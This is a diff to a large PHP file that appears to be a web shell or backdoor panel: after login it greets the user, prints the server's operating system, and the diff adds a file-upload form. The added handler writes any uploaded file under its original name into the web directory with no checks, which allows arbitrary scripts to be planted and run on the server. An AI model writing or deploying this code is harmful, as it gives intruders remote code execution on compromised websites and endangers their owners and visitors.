@@ -862,6 +862,7 @@ if(isset($_POST['pass'])){
 }
 if (isset($_SESSION['user']) && !empty($_SESSION['user'])) {
 	ob_clean();
+	header("content-type:text/html;charset=utf-8");
 	echo "Wellcome " .$_SESSION['user'];
 	echo "                                            ";
 	echo "<a href=?op=exit>Exit click here!</a>";
@@ -869,6 +870,23 @@ if (isset($_SESSION['user']) && !empty($_SESSION['user'])) {
 	echo "<p>";
 	echo PHP_OS;
 	echo "<p>";
+
+	echo "
+	<form  method=\"post\" enctype=\"multipart/form-data\">
+	<text >
+	<input type=\"file\" name=\"upfile\"/><br/>
+	<input type=\"submit\" value=\"upload\"/>
+	</form> ";
+
+	if(isset($_FILES['upfile'])){
+		$upfile = $_FILES['upfile'];
+		$dest="./".$upfile['name'];
+		print $dest;
+		if(!move_uploaded_file($upfile['tmp_name'],$dest)){
+			print "<p> error to upload is your file to big?";
+		}
+	}
+
 	$op = $_GET['op'];
 	if($op==='exit'){
 		session_destroy();
